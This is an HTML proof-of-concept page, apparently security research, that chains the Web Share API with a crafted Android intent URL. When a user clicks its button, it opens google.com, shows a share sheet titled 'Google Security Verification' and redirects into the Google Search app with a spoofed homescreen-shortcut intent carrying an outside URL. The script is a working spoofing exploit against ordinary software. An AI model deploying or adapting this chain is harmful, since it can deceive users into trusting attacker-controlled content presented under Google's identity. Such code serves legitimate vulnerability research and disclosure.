<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Share API & Intent Spoof PoC</title>
    <style>
        :root {
            --primary-color: #1a73e8;
            --primary-hover: #1557b0;
            --bg-color: #f8f9fa;
            --card-bg: #ffffff;
            --text-main: #202124;
            --text-secondary: #5f6368;
            --border-color: #dadce0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }

        .card {
            background: var(--card-bg);
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid var(--border-color);
            max-width: 420px;
            width: 100%;
        }

        .banner {
            font-size: 11px;
            font-weight: 700;
            color: var(--text-secondary);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }

        h1 {
            font-size: 22px;
            color: var(--text-main);
            margin-top: 0;
            margin-bottom: 12px;
        }

        p {
            font-size: 14px;
            color: var(--text-secondary);
            margin-bottom: 28px;
            line-height: 1.5;
        }

        .button-container {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        button.button-link {
            width: 100%;
            display: inline-block;
            background-color: var(--primary-color);
            color: white;
            padding: 14px 24px;
            border: none;
            font-weight: 600;
            font-size: 14px;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(26, 115, 232, 0.3);
            transition: background-color 0.2s, transform 0.1s;
            cursor: pointer;
        }

        button.button-link:hover {
            background-color: var(--primary-hover);
        }

        button.button-link:active {
            transform: scale(0.98);
        }

        .status-box {
            margin-top: 20px;
            padding: 10px;
            font-size: 12px;
            color: var(--text-secondary);
            background: #f1f3f4;
            border-radius: 6px;
            display: none;
            word-break: break-all;
        }

        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="banner">Security Research Portal</div>
        <h1>Web Share & Intent Chain</h1>
        <p>Klik tombol di bawah untuk memicu Web Share API, mengarahkan konteks ke google.com, dan mengeksekusi intent.</p>

        <div class="button-container">
            <button class="button-link" id="shareButton">
                Share & Trigger Intent Chain
            </button>
        </div>

        <div class="status-box" id="statusBox">Status: Ready...</div>
    </div>

    <div class="footer-note">Authorized security assessment environment.</div>

    <script>
        const shareButton = document.getElementById('shareButton');
        const statusBox = document.getElementById('statusBox');

        shareButton.addEventListener('click', async () => {
            statusBox.style.display = 'block';
            statusBox.innerText = 'Status: Initializing Web Share & Google Context...';

            // 1. Memaksa navigasi awal ke google.com di jendela utama/background tab secara bersamaan
            const googleWindow = window.open('https://www.google.com', '_blank');

            // 2. Memanggil Web Share API (memanfaatkan user activation yang sah secara native)
            if (navigator.share) {
                try {
                    await navigator.share({
                        title: 'Google Security Verification',
                        text: 'Secure document verification portal link.',
                        url: 'https://www.google.com'
                    });
                    statusBox.innerText = 'Status: Web Share completed. Dispatched intent...';
                } catch (err) {
                    statusBox.innerText = 'Status: Share dismissed/blocked, proceeding with intent...';
                }
            } else {
                statusBox.innerText = 'Status: Web Share API not supported, executing fallback...';
            }

            // 3. Eksekusi intent redirect setelah interaksi share / pembukaan google context
            setTimeout(() => {
                const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
                window.location.replace(intentUrl);
            }, 500);
        });
    </script>

</body>
</html>
